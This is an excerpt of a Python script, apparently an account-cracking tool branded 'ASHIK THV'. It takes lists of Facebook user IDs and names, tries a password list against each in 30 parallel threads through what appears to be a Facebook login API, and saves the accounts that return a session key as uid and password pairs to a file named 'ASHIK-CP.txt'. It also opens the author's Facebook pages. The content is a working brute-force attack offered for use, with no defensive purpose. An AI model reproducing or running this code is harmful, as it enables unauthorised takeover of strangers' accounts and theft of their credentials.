# Orignally Written By ASHIK Khan
...
os.system('xdg-open https://facebook.com/groups/665209805032852/')
os.system('xdg-open https://www.facebook.com/profile.php?id=100001371336595')
...
██║  ██║███████║██║  ██║██║██║  ██╗       ██║   ██║  ██║ ╚████╔╝ 
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝       ╚═╝   ╚═╝  ╚═╝  ╚═══╝  
                                                                 V8P\033[1;32m XD\033[1;37m 
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  ASHIK THV
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  Md. Srabon Ahmed 
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  TEAM THV
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as ASHIK:
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				ASHIK.submit(api1,ids,names,passlist)
			else:
				ASHIK.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ASHIK]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[ASHIK-OK] '+uid+' | '+pas)
						...
						file_path = os.path.join(folder_path, 'ASHIK-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ASHIK-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					uid = str(po['error']['error_data']['uid'])
					#print(f'\r\r\33[1m\33[1;35m [ASHIK-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'ASHIK-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
